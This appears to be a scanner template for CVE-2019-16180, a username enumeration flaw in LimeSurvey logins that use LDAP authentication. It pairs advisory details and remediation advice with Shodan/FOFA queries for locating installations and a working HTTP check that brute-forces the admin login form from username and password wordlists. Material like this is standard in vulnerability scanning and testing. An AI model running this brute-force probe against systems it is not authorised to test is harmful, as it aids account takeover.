id: CVE-2019-16180

info:
  name: Limesurvey Username Enumeration via LDAP Authentication Bruteforce
  author: ProjectDiscoveryAI
  severity: medium
  description: Limesurvey before 3.17.14 allows remote attackers to bruteforce the login form and enumerate usernames when the LDAP authentication method is used.
  impact: |
    Successful enumeration of valid usernames can aid attackers in launching targeted attacks.
  remediation: |
    Implement account lockout mechanisms and ensure error messages do not reveal valid usernames.
  reference:
    - https://github.com/LimeSurvey/LimeSurvey/commit/5870fd1037058bc4e43cccf893b576c72293371e#diff-d539f3f8185667ee48db78e1bf65a3b4R44
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2019-16180
    epss-score: 0.00155
    epss-percentile: 0.53026
    cpe: cpe:2.3:a:limesurvey:limesurvey:*:*:*:*:*:*:*:*
  metadata:
    vendor: limesurvey
    product: limesurvey
    shodan-query:
      - http.favicon.hash:"1781653957"
      - http.html:"limesurvey installer"
    fofa-query:
      - body="limesurvey installer"
      - icon_hash=1781653957

http:
  - method: POST
    path:
      - "{{BaseURL}}/index.php/admin/authentication/sa/login"

    body: |
      username={{username}}&password={{password}}&loginlang=default

    headers:
      Content-Type: application/x-www-form-urlencoded
    attack: batteringram
    payloads:
      username: usernames.txt
      password: passwords.txt
    matchers:
      - type: word
        words:
          - "Incorrect username and/or password!"
        part: body
